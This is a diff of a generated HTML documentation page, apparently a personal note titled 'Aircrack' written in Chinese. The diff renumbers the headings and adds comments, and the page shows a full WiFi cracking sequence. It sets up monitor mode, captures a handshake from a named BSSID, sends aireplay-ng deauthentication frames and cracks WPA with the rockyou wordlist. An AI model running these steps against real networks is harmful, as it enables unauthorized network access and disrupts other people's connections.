@@ -64,7 +64,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#_1" class="md-skip">
+        <a href="#1" class="md-skip">
           Skip to content
         </a>
       
@@ -328,15 +328,15 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
+  <a href="#1" class="md-nav__link">
     <span class="md-ellipsis">
       
-        网卡
+        1. 网卡
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="网卡">
+    <nav class="md-nav" aria-label="1. 网卡">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -367,10 +367,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#aircrack-ng" class="md-nav__link">
+  <a href="#2-aircrack-ng" class="md-nav__link">
     <span class="md-ellipsis">
       
-        aircrack-ng
+        2. aircrack-ng
       
     </span>
   </a>
@@ -378,10 +378,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
+  <a href="#3" class="md-nav__link">
     <span class="md-ellipsis">
       
-        恢复网络
+        3. 恢复网络
       
     </span>
   </a>
@@ -569,15 +569,15 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
+  <a href="#1" class="md-nav__link">
     <span class="md-ellipsis">
       
-        网卡
+        1. 网卡
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="网卡">
+    <nav class="md-nav" aria-label="1. 网卡">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -608,10 +608,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#aircrack-ng" class="md-nav__link">
+  <a href="#2-aircrack-ng" class="md-nav__link">
     <span class="md-ellipsis">
       
-        aircrack-ng
+        2. aircrack-ng
       
     </span>
   </a>
@@ -619,10 +619,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
+  <a href="#3" class="md-nav__link">
     <span class="md-ellipsis">
       
-        恢复网络
+        3. 恢复网络
       
     </span>
   </a>
@@ -648,7 +648,7 @@
 
   <h1>Aircrack</h1>
 
-<h2 id="_1">网卡</h2>
+<h2 id="1">1. 网卡</h2>
 <h3 id="chip">chip</h3>
 <ul>
 <li>AR9271</li>
@@ -689,8 +689,9 @@ $dmesg | grep ath
 [23314.910250] ath: Regpair used: 0x52<br />
 [23314.910252] ath: regdomain 0x809c dynamically updated by country element<br />
 [23314.944736] ath9k_htc 1-2:1.0 wlxbc307dfc3994: renamed from wlan0  </p>
-<h2 id="aircrack-ng">aircrack-ng</h2>
-<pre><code>ip a
+<h2 id="2-aircrack-ng">2. aircrack-ng</h2>
+<pre><code># start moniter
+ip a
 </code></pre>
 <p><img alt="" src="../../assets/images/Pasted%20image%2020260527182628.png" /></p>
 <pre><code>sudo airmon-ng check
@@ -699,17 +700,20 @@ sudo airmon-ng start wlan0mon
 ip a
 </code></pre>
 <p><img alt="" src="../../assets/images/Pasted%20image%2020260527182606.png" /></p>
-<pre><code>sudo airodump-ng wlan0mon
+<pre><code># start scan wifi
+sudo airodump-ng wlan0mon
 </code></pre>
 <p><img alt="" src="../../assets/images/Pasted%20image%2020260527182347.png" /></p>
-<pre><code>sudo airodump-ng -c 5 --bssid F6:6D:2F:13:3B:D5 -w TPGuestcap wlan0mon
+<pre><code># start capture
+sudo airodump-ng -c 5 --bssid F6:6D:2F:13:3B:D5 -w TPGuestcap wlan0mon
 sudo aireplay-ng --deauth 8 -a F6:6D:2F:13:3B:D5 wlan0mon
 </code></pre>
 <p><img alt="" src="../../assets/images/Pasted%20image%2020260527182455.png" /></p>
-<pre><code>aircrack-ng -a 2 -b F6:6D:2F:13:3B:D5 -w ../tools/rockyou.txt TPGuestcap-01.cap
+<pre><code># start crack
+aircrack-ng -a 2 -b F6:6D:2F:13:3B:D5 -w ../tools/rockyou.txt TPGuestcap-01.cap
 </code></pre>
 <p><img alt="" src="../../assets/images/Pasted%20image%2020260527182006.png" /></p>
-<h2 id="_2">恢复网络</h2>
+<h2 id="3">3. 恢复网络</h2>
 <pre><code>sudo airmon stop wlan0mon
 sudo systemctl start NetworkManager
 </code></pre>
